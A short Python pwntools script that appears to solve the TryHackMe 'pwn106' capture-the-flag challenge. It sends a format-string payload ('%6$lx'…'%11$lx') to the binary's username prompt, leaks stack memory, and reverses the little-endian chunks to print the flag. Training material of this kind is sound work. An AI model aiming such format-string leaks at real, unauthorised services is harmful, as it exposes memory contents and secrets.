from pwn import *
from struct import pack
from Crypto.Util.number import bytes_to_long as btl, long_to_bytes as ltb
import sys

BINARY = "pwn106user.pwn106-user"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "critical"

class Exploit:
    def __init__(self, p: process):
        self.p = p
    
    def debug(self, script):
        if not args.RMT:
            attach(self.p, script)
        
    def send(self, content):
        p = self.p
        p.sendlineafter(b"Enter your THM username to participate in the giveaway:", content)

def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p

x, p = init()
x.send(''.join([f"%{i}$lx" for i in range(6, 6+6)]).encode())
p.recvuntil(b"Thanks ")
flag_endian = unhex(p.recvline()).decode()
flag = ""
for i in range(0, len(flag_endian), 8):
    flag += flag_endian[i:i+8][::-1]
print(flag)
    